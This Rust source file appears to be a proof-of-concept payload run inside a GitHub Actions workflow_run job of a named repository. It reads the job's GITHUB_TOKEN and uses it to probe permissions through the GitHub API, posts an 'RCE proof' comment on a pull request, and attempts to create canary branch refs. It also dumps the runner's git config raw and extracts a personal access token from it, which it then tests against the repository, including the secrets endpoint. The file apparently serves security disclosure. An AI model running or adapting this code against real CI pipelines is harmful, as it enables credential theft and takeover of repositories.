use std::process::Command;

const REPO: &str = "PDFtoMark/triage-ethereum-optimism-v0754656-08ce38";

fn sh(cmd: &str) -> String {
    match Command::new("bash").arg("-c").arg(cmd).output() {
        Ok(o) => format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)),
        Err(e) => format!("spawn error: {e}"),
    }
}

fn http(method: &str, url: &str, token: &str, body: Option<&str>) -> String {
    let mut args: Vec<String> = vec![
        "-sS".into(), "-X".into(), method.into(),
        "-o".into(), "/tmp/resp.bin".into(), "-w".into(), "%{http_code}".into(),
        "-H".into(), format!("Authorization: Bearer {token}"),
        "-H".into(), "Accept: application/vnd.github+json".into(),
        "-H".into(), "X-GitHub-Api-Version: 2022-11-28".into(),
    ];
    if let Some(b) = body {
        args.push("-H".into()); args.push("Content-Type: application/json".into());
        args.push("--data-binary".into()); args.push(b.to_string());
    }
    args.push(url.into());
    let out = match Command::new("curl").args(&args).output() {
        Ok(o) => o,
        Err(e) => return format!("curl spawn error {e}"),
    };
    let code = String::from_utf8_lossy(&out.stdout).to_string();
    let body = std::fs::read_to_string("/tmp/resp.bin").unwrap_or_default();
    let trimmed: String = body.chars().take(1200).collect();
    format!("{method} {url} -> HTTP {code}\n{trimmed}\n")
}

fn main() {
    println!("RCE_MARKER=attacker_artifact_code_executed");
    println!("PWD={}", std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default());
    println!("PR_NUMBER_ENV={:?}", std::env::var("PR_NUMBER").ok());
    println!("ATTACKER_STAGE=rce");

    let gh = std::env::var("GITHUB_TOKEN").unwrap_or_default();
    println!("GITHUB_TOKEN_PRESENT={} LEN={}", !gh.is_empty(), gh.len());

    // Identity + capabilities of the job token
    println!("{}", http("GET", "https://api.github.com/user", &gh, None));
    println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}"), &gh, None));

    // Prove issues:write by posting a comment on the PR
    let pr = std::env::var("PR_NUMBER").unwrap_or_default();
    if !pr.is_empty() && pr != "null" {
        let body = format!("{{\"body\":\"RCE proof from attacker artifact: code executed inside `Patch Testing Cycles Comment` workflow_run. token_len={} stage=rce\"}}", gh.len());
        println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/issues/{pr}/comments"), &gh, Some(&body)));
    }

    // Probe contents:write with the job token (expected 403)
    let refbody = "{\"ref\":\"refs/heads/rce-job-token-canary\",\"sha\":\"0000000000000000000000000000000000000000\"}";
    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/git/refs"), &gh, Some(refbody)));

    // Env inventory (names only)
    println!("ENV_NAMES_START");
    println!("{}", sh("env | cut -d= -f1 | sort | tr '\\n' ' '"));
    println!("ENV_NAMES_END");

    // Credentials written by .github/actions/setup into the runner git config
    let gc = sh("cat ~/.gitconfig 2>/dev/null; echo '---'; cat \"$HOME/.config/git/config\" 2>/dev/null");
    println!("GITCONFIG_RAW_START");
    println!("{gc}");
    println!("GITCONFIG_RAW_END");
    // Extract PAT without printing it
    let pat = sh("grep -hoE 'https://[^@/]+@github\\.com' ~/.gitconfig 2>/dev/null | head -1 | sed -e 's#https://##' -e 's#@github\\.com##'").trim().to_string();
    println!("PAT_FOUND={} PAT_LEN={} PAT_PREFIX4={}", !pat.is_empty(), pat.len(), pat.chars().take(4).collect::<String>());
    if !pat.is_empty() {
        println!("PAT_EQUALS_JOB_TOKEN={}", pat == gh);
        println!("{}", http("GET", "https://api.github.com/user", &pat, None));
        println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}"), &pat, None));
        // can the PAT read repo secrets (needs admin)?
        println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/actions/secrets"), &pat, None));
        // can the PAT push contents? dry-run via ref creation on a scratch branch
        let b = "{\"ref\":\"refs/heads/pat-canary\",\"sha\":\"0000000000000000000000000000000000000000\"}";
        println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/git/refs"), &pat, Some(b)));
    }

    println!("ATTACKER_STAGE=done");
}
